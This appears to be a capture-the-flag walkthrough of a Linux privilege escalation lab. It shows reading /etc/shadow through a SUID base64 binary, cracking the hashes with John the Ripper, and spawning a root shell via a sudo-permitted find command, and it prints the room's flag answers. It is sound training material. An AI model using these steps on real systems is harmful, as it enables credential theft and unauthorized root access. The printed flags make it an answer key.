We made it to the capstone challenge!

By now you have a fairly good understanding of the main privilege escalation vectors on Linux and this challenge should be fairly easy.

You have gained SSH access to a large scientific facility. Try to elevate your privileges until you are Root.
We designed this room to help you build a thorough methodology for Linux privilege escalation that will be very useful in exams such as OSCP and your penetration testing engagements.

Leave no privilege escalation vector unexplored, privilege escalation is often more an art than a science.

You can access the target machine over your browser or use the SSH credentials below.

### Q.1: What is the content of the flag1.txt file?
I am going to go through the techniques learned in this room sequentially, until we find a method to use.

After that, let's see what type of privileges we have by ```whoami``` and ```id``` command.
```
[leonard@ip-10-201-11-28 ~]$ whoami
leonard
[leonard@ip-10-201-11-28 ~]$ id
uid=1000(leonard) gid=1000(leonard) groups=1000(leonard) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```
Unfortunately, we can’t use ```sudo  - l```. 

I tried printing the passwd files to see which users are on the system:
```cat /etc/passwd | cut -d ":" -f 1```

The shadow file is off limits though. The history file also not showing anything useful. 

We've to find a files that are readable, writable and executable by all user.
```find / -type f -perm 0777 2>/dev/null```. These command doesn't showing anything.

Another try, look for files with the SUID bit:
```find / -type f -perm -u=s -ls 2>/dev/null```

Remember in the SUID section when we used **base64** to **unshadow our /shadow and /passwd** file. Let's do that again.
```
[leonard@ip-10-201-49-126 ~]$ find / -type f -perm -u=s -ls 2>/dev/null
16779966   40 -rwsr-xr-x   1 root     root        37360 Aug 20  2019 /usr/bin/base64
17298702   60 -rwsr-xr-x   1 root     root        61320 Sep 30  2020 /usr/bin/ksu
17261777   32 -rwsr-xr-x   1 root     root        32096 Oct 30  2018 /usr/bin/fusermount
```

This allows us to do the unshadow trick again, and cracking with john:
```base64 /etc/shadow | base64 --decode > shadow.txt && base64 /etc/passwd | base64 --decode > passwd.txt```

Now we are ready to use unshadow again,. Remember, we need to do this on our local machine. So I has to manually copy the file contents in new files on our local machine. Finally, run the following:
```unshadow passwd.txt shadow.txt > password.txt```

Now, in our local terminal, we can use **John The Ripper** to crack the password. Run the command ```sudo unshadow passwd.txt shadow.txt > password.txt```. We can see that Missy's password is **Password1**.
```
john --wordlist=/usr/share/wordlists/rockyou.txt password.txt 
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
Password1        (missy)     
```
Now, back in Leonard's terminal, let's try to log in as **Missy**. Run the ```su missy``` and enter password.
```
[leonard@ip-10-201-49-126 ~]$ su missy
Password: 
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
	LANGUAGE = (unset),
	LC_ALL = (unset),
	LANG = "C.UTF-8"
    are supported and installed on your system.
perl: warning: Falling back to the standard locale ("C").
[missy@ip-10-201-49-126 leonard]$ whoami
missy
```
The ```sudo -l``` command will reveal that **missy** no needs password to access data.

Now we can go ahead and access our **flag1.txt** file. First we need to find it by ```find / -name flag1.txt 2>/dev/null```.
```
[missy@ip-10-201-13-219 leonard]$ find / -name flag1.txt 2>/dev/null
/home/missy/Documents/flag1.txt
```
To read the flag, simply run ```cat /home/missy/Documents/flag1.txt```.
```
[missy@ip-10-201-13-219 leonard]$ cat /home/missy/Documents/flag1.txt
THM-42828719920544
```
### Answer: THM-42828719920544

### Q.2: What is the content of the flag2.txt file?
With that over it, we can check for more vulnerabilities. We lack root after all. Going through a similar process as before, I quickly found out something interesting while running ```sudo -l`` again:
```
[missy@ip-10-201-13-219 leonard]$ sudo -l
Matching Defaults entries for missy on ip-10-201-13-219:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL
    PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User missy may run the following commands on ip-10-201-13-219:
    (ALL) NOPASSWD: /usr/bin/find
```
Missy can run ```/usr/bin/find``` as **root**.

Where to find out how to abuse this? GTFOBins of course: https://gtfobins.github.io/gtfobins/find

As mentioned:

If the binary is allowed to run as superuser by ```sudo```, it has root privileges and can be used to access the file system, escalate or maintain privileged access.
```sudo find . -exec /bin/sh \; -quit```

This gives us root:
```
[missy@ip-10-201-13-219 leonard]$ sudo find . -exec /bin/sh \; -quit
sh-4.2# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

The final flag can be found here:
```
sh-4.2# find / -name flag2.txt 2>/dev/null
/home/rootflag/flag2.txt
```

Let’s read it:
```
sh-4.2# cat /home/rootflag/flag2.txt
THM-168824782390238
```
### Answer: THM-168824782390238

We are done with Linux Privilege Escalation!

## Congratulations, we are done! WE DID IT!
